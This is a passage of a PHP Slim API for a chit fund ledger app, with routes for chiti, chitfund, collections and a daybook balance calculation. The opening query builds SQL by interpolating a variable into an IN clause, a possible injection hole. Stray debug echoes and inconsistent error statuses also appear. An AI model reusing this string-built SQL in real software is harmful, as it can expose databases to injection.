		$lastnoteslist = $db->getdynamicRecord("select *,b.note as lastnote from chiti a inner join asalu b on a.id = b.chiti and b.id = ( SELECT c.id FROM asalu c WHERE c.chiti = b.chiti ORDER BY c.date DESC LIMIT 1 ) INNER JOIN customers d on a.customer = d.id WHERE a.irregular = 1 and status = 1 and chiti IN ($cid) ", 1000);
		// echo json_encode($lastnoteslist);


	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Chiti found with given ID";
		echoRespnse(201, $response);
		return;
	}

	$response["error"] = false;
	$response['status'] = "success";
	$response["lastnoteslist"] = $lastnoteslist;
	$response["message"] = "Woot!,Successfully retreived the Chiti list";


	echoRespnse(200, $response);

});

$app->get('/chitfund/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();
	$params = $db->getFunctionParam("chitfund");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == 'id') {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$chitfundlist = call_user_func_array(array($db, 'getchitfund'), $getdata);
	$outputfields = array("id", "customer", "date", "amount", "type", "status", "customername", "created", "updated");
	$qryfields = array("id", "customer", "date", "amount", "type", "status", "customername", "created", "updated");
	$chitfund = array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($chitfundlist); $i++) {

		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($chitfundlist[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $chitfundlist[$i][$outputfields[$j]];
			}
		}
		//	array_push($customer,$tmp);

	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getcustomers'), $getdata)[0]["count(*)"];
	$response["chitfund"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the chitfund list";


	echoRespnse(200, $response);

});





//delete chiti start
$app->delete('/chiti/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$getchitidata = array();
	$param = $db->getFunctionParam("chiti");
	for ($i = 0; $i < sizeof($param); $i++) {
		if ($param[$i] == "id") {
			array_push($getchitidata, $id);
		} else {
			array_push($getchitidata, "");
		}
	}

	$chitiDetail = call_user_func_array(array($db, 'getchiti'), $getchitidata);

	if (sizeof($chitiDetail) > 0) {
		//delete collection start
		$getcoldata = array();
		$paramss = $db->getFunctionParam("collection");
		for ($m = 0; $m < sizeof($paramss); $m++) {
			if ($paramss[$m] == "chiti") {
				array_push($getcoldata, $id);
			} else {
				array_push($getcoldata, "");
			}
		}
		$collectionDetail = call_user_func_array(array($db, 'getcollection'), $getcoldata);
		// echo json_encode($collectionDetail);
		if (sizeof($collectionDetail) > 0) {
			for ($h = 0; $h < sizeof($collectionDetail); $h++) {
				$params = $db->putFunctionParam("collection");
				$updateField = array();
				$updateField["id"] = $collectionDetail[$h]["id"];
				$putdata = array();
				array_push($putdata, $updateField);
				for ($i = 0; $i < sizeof($params); $i++) {
					array_push($putdata, "");
				}
				array_push($putdata, "1");
				$editDetail = call_user_func_array(array($db, 'editcollection'), $putdata);

			}

			if ($editDetail) {
				$getrcvddata = array();
				$paramss = $db->getFunctionParam("receivedamount");
				for ($m = 0; $m < sizeof($paramss); $m++) {
					if ($paramss[$m] == "chiti") {
						array_push($getrcvddata, $id);
					} else {
						array_push($getrcvddata, "");
					}
				}

				$rcvdDetail = call_user_func_array(array($db, 'getreceivedamount'), $getrcvddata);

				if (sizeof($rcvdDetail) > 0) {
					for ($h = 0; $h < sizeof($rcvdDetail); $h++) {
						$params = $db->putFunctionParam("received");
						$updateField = array();
						$updateField["id"] = $rcvdDetail[$h]["id"];
						$putdata = array();
						array_push($putdata, $updateField);
						for ($i = 0; $i < sizeof($params); $i++) {
							array_push($putdata, "");

						}
						array_push($putdata, "1");
						$editrcvdDetail = call_user_func_array(array($db, 'editreceived'), $putdata);

					}
					//start
					$getasaludata = array();
					$paramss = $db->getFunctionParam("asalu");
					for ($m = 0; $m < sizeof($paramss); $m++) {
						if ($paramss[$m] == "chiti") {
							array_push($getasaludata, $id);
						} else {
							array_push($getasaludata, "");
						}
					}

					$asaluDetail = call_user_func_array(array($db, 'getasalu'), $getasaludata);

					if (sizeof($asaluDetail) > 0) {
						for ($h = 0; $h < sizeof($asaluDetail); $h++) {
							$params = $db->putFunctionParam("asalu");
							$updateField = array();
							$updateField["id"] = $asaluDetail[$h]["id"];
							$putdata = array();
							array_push($putdata, $updateField);
							for ($i = 0; $i < sizeof($params); $i++) {
								array_push($putdata, "");

							}
							array_push($putdata, "1");
							$editrcvdDetail = call_user_func_array(array($db, 'editasalu'), $putdata);


						}
					}
				}
			} else {
				$response["error"] = true;
				$response["status"] = "error";
				$response["message"] = "Oops! An error occurred while deleting collection information";
				$response["err"] = $editDetail;
			}


		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "No collection found with given chiti";
			echoRespnse(201, $response);
			return;
		}
		$params = $db->putFunctionParam("chiti");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			array_push($putdata, "");

		}
		array_push($putdata, "1");
		$editchitiDetail = call_user_func_array(array($db, 'editchiti'), $putdata);
		if ($editchitiDetail) {
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully deleted Chiti and its collections";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while deleting Chiti information";
			$response["err"] = $editchitiDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Chiti found with given ID";
	}


	echoRespnse(201, $response);
});
//delete chiti end


$app->put('/chiti/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	// echo json_encode($r);
	$db = new DbHandler();
	$getdata = array();
	$datechanged = false;
	$params = $db->getFunctionParam("chiti");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$chitiDetail = call_user_func_array(array($db, 'getchiti'), $getdata);
	if (sizeof($chitiDetail) > 0) {

		$delallpmTrans = false;
		if ($chitiDetail[0]["paymentmode"] == 50 && putParam($r, "paymentmode") != 50) {
			$delallpmTrans = true;
		}
		if ($chitiDetail[0]["date"] != putParam($r, "date")) {
			$datechanged = true;
		}

		$params = $db->putFunctionParam("chiti");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i]) || putParam($r, $params[$i]) == 0) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");
	}
	$editDetail = call_user_func_array(array($db, 'editchiti'), $putdata);

	if ($editDetail) {
		$customParams = array();
		if (putParam($r, "suri") != $chitiDetail[0]["suri"]) {
			array_push($customParams, "suri");
		}
		if (putParam($r, "sowji") != $chitiDetail[0]["sowji"]) {
			array_push($customParams, "sowji");
		}
		if (putParam($r, "fullandevi") != $chitiDetail[0]["fullandevi"]) {
			array_push($customParams, "fullandevi");
		}
		// echo putParam($r,"suri");
		// echo json_encode($customParams);
		if (sizeof($customParams)) {
			$getdata = array();
			$params = $db->getFunctionParam("collection");
			for ($i = 0; $i < sizeof($params); $i++) {
				if ($params[$i] == "chiti") {
					array_push($getdata, $id);
				} else {
					array_push($getdata, "");
				}
			}

			$collectionDetail = call_user_func_array(array($db, 'getcollection'), $getdata);
			if (sizeof($collectionDetail) > 0) {
				for ($k = 0; $k < sizeof($collectionDetail); $k++) {
					$params = $db->putFunctionParam("collection");
					$updateField = array();
					$updateField["id"] = $collectionDetail[$k]["id"];
					$putdata = array();
					array_push($putdata, $updateField);
					for ($i = 0; $i < sizeof($params); $i++) {
						for ($m = 0; $m < sizeof($customParams); $m++) {
							// echo ($params[$i] == $customParams[$m]);
							if ($params[$i] == $customParams[$m]) {
								// echo "val->"; echo putParam($r,$params[$i]);
								array_push($putdata, putParam($r, $params[$i]));
							} else {
								array_push($putdata, "");
							}
						}
					}
					array_push($putdata, "");
					$editDetail = call_user_func_array(array($db, 'editcollection'), $putdata);
				}
			}


		}
		if (putParam($r, "paymentmode") == 50 && putParam($r, "pmtrans")) {
			$pmtrans = putParam($r, "pmtrans");
			if ($datechanged) {
				for ($b = 0; $b < sizeof($pmtrans); $b++) {
					$pmtrans[$b]->date = putParam($r, "date");
				}
			}
			$opParam = "pmtrans";
			$mainId = "tableid";
			$outputfields = array("date", "tablename", "tableid", "paymentmode", "credit", "debit", "created", "updated");
			$getFunction = "getPmTrans";
			$syncdata = $pmtrans;
			$putFunction = "editPmTrans";
			$tablename = "chiti";
			$syncData = updateTable($db, $opParam, $mainId, $outputfields, $getFunction, $syncdata, $putFunction, $id, $tablename, explode(",", $chitiDetail[0]["pmid"]));


			if ($syncData && sizeof($syncData) > 0) {
				$pmid = array();
				for ($i = 0; $i < sizeof($syncData); $i++) {
					// echo "i-".$i."end i ";
					// echo json_encode($syncData)."enddata";
					$syncData[$i]["date"] = ($datechanged) ? putParam($r, "date") : $chitiDetail[0]["date"];
					$syncData[$i]["tableid"] = $id;
					$syncData[$i]["tablename"] = "chiti";
					$createpmtransstatus = $db->createPmTrans($syncData[$i]);
					// echo json_encode($createpmtransstatus);
					// array_push($tmp,$syncData[$i]["no"]);
					array_push($pmid, $createpmtransstatus['id']);
				}

				if ($pmid && sizeof($pmid) > 0) {
					$params = $db->getFunctionParam("chiti");
					$getdata = array();
					for ($i = 0; $i < sizeof($params); $i++) {
						if ($params[$i] == "id") {
							array_push($getdata, $id);
						} else {
							array_push($getdata, "");
						}
					}
					$chitiDetail1 = call_user_func_array(array($db, 'getchiti'), $getdata);
					// echo " 2- ".json_encode($chitiDetail1[0]["pmid"]);
					if (sizeOf($chitiDetail1) > 0) {
						$params = $db->putFunctionParam("chiti");
						$updateField = array();
						$updateField["id"] = $id;
						$putdata = array();
						array_push($putdata, $updateField);
						for ($i = 0; $i < sizeof($params); $i++) {
							if ($params[$i] == "pmid") {
								// echo "size".strlen($chitiDetail1[0]["pmid"]);
								if (strlen(trim($chitiDetail1[0]["pmid"])) > 0) {
									$tempstr = "";
									$tempstr = strval($chitiDetail1[0]["pmid"]) . ',' . strval(implode(',', $pmid));
									array_push($putdata, $tempstr);
									// echo " 2.1- ".$tempstr;
								} else {
									array_push($putdata, implode(',', $pmid));
									// echo " 2.2- ".implode(',', $pmid);
								}
							} else {
								array_push($putdata, "");
							}
						}
						array_push($putdata, "");
						// echo " 3- ".json_encode($putdata);
						$editDetail = call_user_func_array(array($db, 'editchiti'), $putdata);

					}
				}

			}
			// }
		}

		if ($delallpmTrans) {
			$params = $db->putFunctionParam("pmtrans");
			$updateField = array();
			$updateField["tablename"] = "chiti";
			$updateField["tableid"] = $id;
			$putdata = array();
			array_push($putdata, $updateField);
			for ($i = 0; $i < sizeof($params); $i++) {
				array_push($putdata, "");
			}
			array_push($putdata, "1");

			$editpmtransDetail = call_user_func_array(array($db, 'editPmTrans'), $putdata);

		}


		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $id;
		$response["message"] = "Woot! , successfully edited Chiti information";
	} else {
		$response["error"] = "true";
		$response["status"] = "success";
		$response["message"] = "Oops! An error occured while editing Chiti information";
		$response["err"] = $editDetail;
	}

	echoRespnse(200, $response);

});

$app->put('/chitfund/:id', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$getdata = array();
	$params = $db->getFunctionParam("chitfund");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$chitfundDetail = call_user_func_array(array($db, 'getchitfund'), $getdata);
	if (sizeof($chitfundDetail) > 0) {
		$params = $db->putFunctionParam("chitfund");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");
	}
	$editDetail = call_user_func_array(array($db, 'editchitfund'), $putdata);

	if ($editDetail) {
		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $id;
		$response["message"] = "Woot! , successfully edited Chit Fund information";
	} else {
		$response["error"] = "true";
		$response["status"] = "success";
		$response["message"] = "Oops! An error occured while editing Chit Fund information";
		$response["err"] = $editDetail;
	}

	echoRespnse(200, $response);

});

$app->get('/collection', function () use ($app) {
	// echo getParams($app->request->get('date'));
	$response = array();
	$db = new DbHandler();
	$colIds = array();
	$params = $db->getFunctionParam("collection");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i])) || (gettype($app->request->get($params[$i])) == "string" && $app->request->get($params[$i]) == "0")) {
			// echo $i; echo "->"; echo getParams($app->request->get($params[$i]));
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$collectionList = call_user_func_array(array($db, 'getcollection'), $getdata);
	$collection = array();

	$outputfields = array("id", "chiti", "code", "tYpe", "status", "chitiamount", "chitidate", "date", "amount", "notes", "sowji", "sowjitotal", "suri", "fullandevi", "iscountable", "received", "reverseid", "receivedfrom", "customer", "customerFL", "hami", "haminame", "rcvddate", "created", "updated", "fields", "sort_by", "sort_order", "group_by", "limit", "offset", "totalcount");
	$qryfields = array("id", "chiti", "code", "tYpe", "status", "chitiamount", "chitidate", "date", "amount", "notes", "sowji", "sowjitotal", "suri", "fullandevi", "iscountable", "received", "reverseid", "receivedfrom", "customer", "customerFL", "hami", "haminame", "rcvddate", "created", "updated", "fields", "sort_by", "sort_order", "group_by", "limit", "offset", "totalcount");
	for ($i = 0; $i < sizeof($collectionList); $i++) {
		array_push($colIds,$collectionList[$i]["id"]);
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($collectionList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $collectionList[$i][$qryfields[$j]];
			}
		}

		// $tmp["pmtrans"] = array();
		// // echo !empty($tmp["paymentmode"]);
		// if(!empty($tmp["paymentmode"]) && $tmp["paymentmode"] == 50){
		// 	$getpmdata = array();
		// 	$params = $db->getFunctionParam("pmtrans");
		// 	for($m=0;$m<sizeof($params);$m++){
		// 		if($params[$m] == "id"){
		// 			$temp = array();
		// 			$temp["op"] = "In";
		// 			$temp["value"] = $tmp["pmid"];
		// 			array_push($getpmdata,json_encode($temp));
		// 		}else{
		// 			array_push($getpmdata,"");
		// 		}
		// 	}
		// 	$tmp["pmtrans"] = call_user_func_array(array($db,'getPmTrans'),$getpmdata);
		// }



		array_push($collection, $tmp);
	}


	if($colIds && sizeof($colIds)>0){
		$params = $db->getFunctionParam("receivedamount");
		$getdata = array();
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "colid") {
				$tmp = array();
				$tmp["op"] = "In";
				$tmp["value"] = implode(',', $colIds);
				array_push($getdata, json_encode($tmp));			
			} else {
				array_push($getdata, "");
			}
		}
		
		$RcvdList = call_user_func_array(array($db, 'getreceivedamount'), $getdata);

		if(sizeof($RcvdList) > 0){
			
			//start
			$pmids = "";
			$seperator = "";
			for($r=0;$r<sizeof($RcvdList);$r++){
				if($RcvdList[$r]["paymentmode"] == 50 && $RcvdList[$r]['pmid'] != ""){
					$pmids .= $seperator . $RcvdList[$r]['pmid'];
					$seperator = ",";
				}
			}
			if($pmids != ""){		
				$getpmdata = array();
				$params = $db->getFunctionParam("pmtrans");
				for ($m = 0; $m < sizeof($params); $m++) {
					if ($params[$m] == "id") {
						$temp = array();
						$temp["op"] = "In";
						$temp["value"] = $pmids;
						array_push($getpmdata, json_encode($temp));
					} else {
						array_push($getpmdata, "");
					}
				}
				$pmtransList = call_user_func_array(array($db, 'getPmTrans'), $getpmdata);
				// $tmppmtrans = sortPmtrans($RcvdList[$h], $pmtransList);
				// $rcvdamtList[$h]['pmtrans'] = $tmppmtrans[0];
				// $pmtransList = $tmppmtrans[1];
			}
			//end
			for($m=0;$m<sizeof($collection);$m++){

				$collection[$m]['pmtrans'] = array();
				for($n=0;$n<sizeof($RcvdList);$n++){
					if($collection[$m]['id'] == $RcvdList[$n]['colid']){
						if($RcvdList[$n]['paymentmode'] > 0){
							if($RcvdList[$n]['paymentmode'] != 50){
								if(sizeof($collection[$m]['pmtrans']) > 0){
									$isExist = false;
									for($b=0;$b<sizeof($collection[$m]['pmtrans']);$b++){
										if($collection[$m]['pmtrans'][$b]['paymentmode'] == $RcvdList[$n]['paymentmode']){
											$isExist = true;
											$collection[$m]['pmtrans'][$b]['credit'] += $RcvdList[$n]['amount'];
											break;
										}
										if(!$isExist){
											// echo "--->".json_encode($RcvdList[$n])."<----";
											$tmp = array();
											$tmp['paymentmode'] = $RcvdList[$n]['paymentmode'];
											$tmp['paymentmodename'] = $RcvdList[$n]['paymentmodename'];
											$tmp['credit'] = $RcvdList[$n]['amount'];
											$tmp['debit'] = 0;
											array_push($collection[$m]['pmtrans'],$tmp);
											echo "--222->".json_encode($collection[$m]["pmtrans"])."<----";
										}
									}
								}else{
									echo "--333->".json_encode($collection[$m]["pmtrans"])."<----";
									
									$tmp = array();
									$tmp['paymentmode'] = $RcvdList[$n]['paymentmode'];
									$tmp['paymentmodename'] = $RcvdList[$n]['paymentmodename'];
									$tmp['credit'] = $RcvdList[$n]['amount'];
									$tmp['debit'] = 0;
									array_push($collection[$m]['pmtrans'],$tmp);
									echo "--444->".json_encode($collection[$m]["pmtrans"])."<----";
								}
								
							}else{
								if(sizeof($pmtransList) > 0){
									$tmppmtrans = sortPmtrans($collection[$m], $pmtransList);
									$collection[$m]['pmtrans'] = $tmppmtrans[0];
									$pmtransList = $tmppmtrans[1];
								}
								// for($w=0;$w<sizeof($RcvdList[$n]['pmtrans']);$w++){
								// 	if(sizeof($collection[$m]['pmtrans']) > 0){
								// 		$isExist = false;
								// 		for($b=0;$b<sizeof($collection[$m]['pmtrans']);$b++){
								// 			if($collection[$m]['pmtrans'][$b]['paymentmode'] == $RcvdList[$n]['pmtrans'][$w]['paymentmode']){
								// 				$isExist = true;
								// 				$collection[$m]['pmtrans'][$b]['credit'] += $RcvdList[$n]['pmtrans'][$w]['credit'];
								// 				break;
								// 			}
								// 			if(!$isExist){
								// 				$tmp = array();
								// 				$tmp['paymentmode'] = $RcvdList[$n]['pmtrans'][$w]['paymentmode'];
								// 				$tmp['paymentmodename'] = $RcvdList[$n]['paymentmodename'];
								// 				$tmp['credit'] = $RcvdList[$n]['pmtrans'][$w]['credit'];
								// 				$tmp['debit'] = 0;
								// 				array_push($collection[$m]['pmtrans'],$tmp);
								// 			}
								// 		}
								// 	}else{
								// 		$tmp = array();
								// 		$tmp['paymentmode'] = $RcvdList[$n]['pmtrans'][$w]['paymentmode'];
								// 		$tmp['paymentmodename'] = $RcvdList[$n]['paymentmodename'];
								// 		$tmp['credit'] = $RcvdList[$n]['pmtrans'][$w]['credit'];
								// 		$tmp['debit'] = 0;
								// 		array_push($collection[$m]['pmtrans'],$tmp);
										
								// 	}								
								// }							
							}
						}					
					}

				}	
			}
		}
	}

	if (getParams($app->request->get('received')) == '0' && getParams($app->request->get('tYpe')) == '{"value":2,"op":"!="}') {
		$params = $db->getFunctionParam("collection");
		$getdata = array();
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "tYpe") {
				$tmp = array();
				$tmp["op"] = "In";
				$tmp["value"] = "1,2,3";
				array_push($getdata, json_encode($tmp));
			} else if ($params[$i] == "group_by") {
				array_push($getdata, "chiti");
			} else {
				if (getParams($app->request->get($params[$i])) || (gettype($app->request->get($params[$i])) == "string" && $app->request->get($params[$i]) == "0")) {
					// echo $i; echo "->"; echo getParams($app->request->get($params[$i]));
					array_push($getdata, getParams($app->request->get($params[$i])));
				} else {
					array_push($getdata, "");
				}
			}
		}
		$weeklycollectionList = call_user_func_array(array($db, 'getcollection'), $getdata);
		for ($s = 0; $s < sizeof($weeklycollectionList); $s++) {
			$chitiids = $weeklycollectionList[$s]["chiti"];
		}

		if ($chitiids) {

		}

		// echo json_encode($weeklycollectionList);
	}

	$response["error"] = "false";
	$response["status"] = "success";
	$response["collection"] = $collection;
	$response["message"] = "Woot ! successfully retreived the CollectionList";
	echoRespnse(200, $response);

});

$app->get('/daybook', function () use ($app) {
	$response = array();
	$db = new DbHandler();
	$date = $app->request->get("date");
	$daybook = array();
	$creditors = array();
	$opbal = array();
	$closingbal = array();
	$mainttl = 0;
	// $creditors["disp"]["rcvdamt"] = 0;
	// $creditors["disp"]["drcr"] = 0;
	// $creditors["disp"]["collection"] = 0;
	// $creditors["disp"]["cftrans"] = 0;
	$creditors["total"] = 0;
	$crcustomerids = array();
	//debtors variable
	$debitors = array();
	// $debitors["disp"]["drcr"] = 0;
	// $debitors["disp"]["cftrans"] = 0;
	$drcustomerids = array();
	$debitors["total"] = 0;
	$pmtransList = array();


	// opbalance section
	$ttmp = array();
	$ttmp["name"] = "main";
	$ttmp["id"] = 0;
	$ttmp["amt"] = 0;
	array_push($opbal, $ttmp);

	$params = $db->getFunctionParam("paymentmodes");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		array_push($getdata, "");
	}
	$paymentmodeList = call_user_func_array(array($db, 'getPaymentmodes'), $getdata);

	for ($r = 0; $r < sizeof($paymentmodeList); $r++) {
		if ($paymentmodeList[$r]["id"] != 50) {
			$ttmp = array();
			$ttmp["name"] = $paymentmodeList[$r]["modename"];
			$ttmp["id"] = $paymentmodeList[$r]["id"];
			$ttmp["amt"] = $paymentmodeList[$r]["opbal"];
			$opbal[0]["amt"] -= $paymentmodeList[$r]["opbal"];
			array_push($opbal, $ttmp);
			// $opbal[$paymentmodeList[$r]["modename"]] = array();
			// $opbal[$paymentmodeList[$r]["modename"]]["id"] = $paymentmodeList[$r]["id"];
			// $opbal[$paymentmodeList[$r]["modename"]]["amt"] = $paymentmodeList[$r]["opbal"];
			// $mainttl += $paymentmodeList[$r]["opbal"];
		}
	}
	// echo "1st opbal".json_encode($opbal);


	//start
	// $getpmdata =array();
	// $params = $db->getFunctionParam("pmtrans");
	// for($m=0;$m<sizeof($params);$m++){
	// 	if($params[$m] == "tablename"){
	// 		array_push($getpmdata,"interest");
	// 	}else{
	// 		array_push($getpmdata,"");
	// 	}
	// }
	// $opbal["pmtrans"] = call_user_func_array(array($db,'getPmTrans'),$getpmdata);

	//end
	$params = $db->getFunctionParam("interest");
	$getdata = array();
	for ($a = 0; $a < sizeof($params); $a++) {
		if ($params[$a] == "date") {
			$tmp = array();
			$tmp["op"] = "<";
			$tmp["value"] = $date;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "note") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = "interestcal";
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "debit") {
			$tmp = array();
			$tmp["op"] = ">=";
			$tmp["value"] = 1;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "paymentmode") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = 50;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "fields") {
			array_push($getdata, "sum(credit) as credittotal,sum(debit) as debittotal");
		} else if ($params[$a] == "group_by") {
			array_push($getdata, "a.paymentmode");
		} else {
			array_push($getdata, "");
		}
	}
	// echo "start getdata".json_encode($getdata)."end getdata";
	$opinterestList = call_user_func_array(array($db, 'getInterest'), $getdata);
	if ($opinterestList && sizeof($opinterestList) > 0) {
		for ($f = 0; $f < sizeof($opinterestList); $f++) {
			for ($g = 0; $g < sizeof($opbal); $g++) {
				if ($opinterestList[$f]["paymentmode"] == $opbal[$g]["id"]) {
					$opbal[$g]["amt"] -= $opinterestList[$f]["debittotal"];
					// $opbal[$opinterestList[$f]["modename"]]["amt"] = $opinterestList[$f]["opbal"];
					// echo "bfre ".$mainttl;
					// $mainttl -= $opinterestList[$f]["debittotal"];
					// echo "aftr ".$mainttl;
					break;
				}
			}
		}
	}

	// echo "opbal['main']--->". $mainttl."interest".json_encode($opinterestList);


	// $getpmdata =array();
	// $params = $db->getFunctionParam("pmtrans");
	// for($m=0;$m<sizeof($params);$m++){
	// 	if($params[$m] == "tablename"){
	// 		array_push($getpmdata,"interest");
	// 	}else if($params[$m] == "tabledate"){
	// 		$tmp = array();
	// 		$tmp["op"] = "<";
	// 		$tmp["value"] = $date;
	// 		array_push($getpmdata,json_encode($tmp));
	// 	}else if($params[$m] == "fields"){
	// 		array_push($getpmdata,"sum(a.credit) as credit,sum(a.debit) as debit");
	// 	}else if($params[$m] == "group_by"){
	// 		array_push($getpmdata,"a.paymentmode");
	// 	}else{
	// 		array_push($getpmdata,"");
	// 	}
	// }
	// $opbalpmtrans = call_user_func_array(array($db,'getPmTrans'),$getpmdata);
	// echo "opbalpmtrans".json_encode($opbalpmtrans);

	// if($opbalpmtrans && sizeof($opbalpmtrans) > 0 ){
	// 	for($f=0;$f<sizeof($opbalpmtrans);$f++){
	// 		for($g=0;$g<sizeof($opbal);$g++){
	// 			if($opbalpmtrans[$f]["paymentmode"] == $opbal[$g]["id"]){
	// 				// $opbal[$g]["amt"] += $opbalpmtrans[$f]["credit"];
	// 				$opbal[$g]["amt"] -= $opbalpmtrans[$f]["debit"]; //only int paid entries
	// 				// $opbal[$opbalpmtrans[$f]["modename"]]["amt"] = $opbalpmtrans[$f]["opbal"];
	// 				// echo "bfre ".$mainttl;
	// 				// $mainttl -= $opbalpmtrans[$f]["debit"];
	// 				// echo "aftr ".$mainttl;
	// 				break;
	// 			}
	// 		}
	// 	}
	// }
	// echo "pmtrans int --->".json_encode($opbalpmtrans);
	// echo "end opbal -> ".json_encode($opbal).$mainttl;






	$params = $db->getFunctionParam("drcr");
	$getdata = array();
	for ($a = 0; $a < sizeof($params); $a++) {
		if ($params[$a] == "date") {
			$tmp = array();
			$tmp["op"] = "<";
			$tmp["value"] = $date;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "note") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = "interestcal";
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "showdaybook") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = 2;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "fields") {
			array_push($getdata, "sum(credit) as credittotal,sum(debit) as debittotal");
		} else if ($params[$a] == "paymentmode") {
			$tmp = array();
			$tmp["op"] = "!=";
			$tmp["value"] = 50;
			array_push($getdata, json_encode($tmp));
		} else if ($params[$a] == "group_by") {
			array_push($getdata, "a.paymentmode");
		} else {
			array_push($getdata, "");
		}
	}

	$opdrcrList = call_user_func_array(array($db, 'getdrcr'), $getdata);

	//start	
	if ($opdrcrList && sizeof($opdrcrList) > 0) {
		for ($f = 0; $f < sizeof($opdrcrList); $f++) {
			for ($g = 0; $g < sizeof($opbal); $g++) {
				if ($opdrcrList[$f]["paymentmode"] == $opbal[$g]["id"]) {
					$opbal[$g]["amt"] += $opdrcrList[$f]["credittotal"];
					$opbal[$g]["amt"] -= $opdrcrList[$f]["debittotal"];
					// $opbal[$opdrcrList[$f]["modename"]]["amt"] = $opdrcrList[$f]["opbal"];
					// echo "bfre ".$mainttl;
					// $mainttl += $opdrcrList[$f]["credittotal"];
					// $mainttl -= $opdrcrList[$f]["debittotal"];
					// echo "aftr ".$mainttl;
					break;
				}
			}
		}
	}

	// echo "opbal['main']--->". $mainttl."opdrcrList".json_encode($opdrcrList);


	// $getpmdata =array();
	// $params = $db->getFunctionParam("pmtrans");
	// for($m=0;$m<sizeof($params);$m++){
	// 	if($params[$m] == "tablename"){
	// 		array_push($getpmdata,"drcr");
	// 	}else if($params[$m] == "tabledate"){
	// 		$tmp = array();
	// 		$tmp["op"] = "<";
	// 		$tmp["value"] = $date;
	// 		array_push($getpmdata,json_encode($tmp));
	// 	}else if($params[$m] == "fields"){
	// 		array_push($getpmdata,"sum(a.credit) as credit,sum(a.debit) as debit");
	// 	}else if($params[$m] == "group_by"){
	// 		array_push($getpmdata,"a.paymentmode");
	// 	}else{
	// 		array_push($getpmdata,"");
	// 	}
	// }
	// $opbaldrcr = call_user_func_array(array($db,'getPmTrans'),$getpmdata);


	// if($opbaldrcr && sizeof($opbaldrcr) > 0 ){
	// 	for($f=0;$f<sizeof($opbaldrcr);$f++){
	// 		for($g=0;$g<sizeof($opbal);$g++){
	// 			if($opbaldrcr[$f]["paymentmode"] == $opbal[$g]["id"]){
	// 				// $opbal[$g]["amt"] -= $opbaldrcr[$f]["amount"];
	// 				$opbal[$g]["amt"] += $opbaldrcr[$f]["credit"];
	// 				$opbal[$g]["amt"] -= $opbaldrcr[$f]["debit"];
	// 				// $opbal[$opbaldrcr[$f]["modename"]]["amt"] = $opbaldrcr[$f]["opbal"];
	// 				// echo "bfre ".$mainttl;
	// 				// $mainttl += $opbaldrcr[$f]["credit"];
	// 				// $mainttl -= $opbaldrcr[$f]["debit"];
	// 				// // $mainttl -= $opbaldrcr[$f]["amount"];
	// 				// echo "aftr ".$mainttl;
	// 				break;
	// 			}
	// 		}
	// 	}
	// }
	// echo "pmtrans drcr --->".json_encode($opbaldrcr);
	// echo "end opbal -> ".json_encode($opbal).$mainttl;



	//end


	// echo json_encode($opdrcrList);

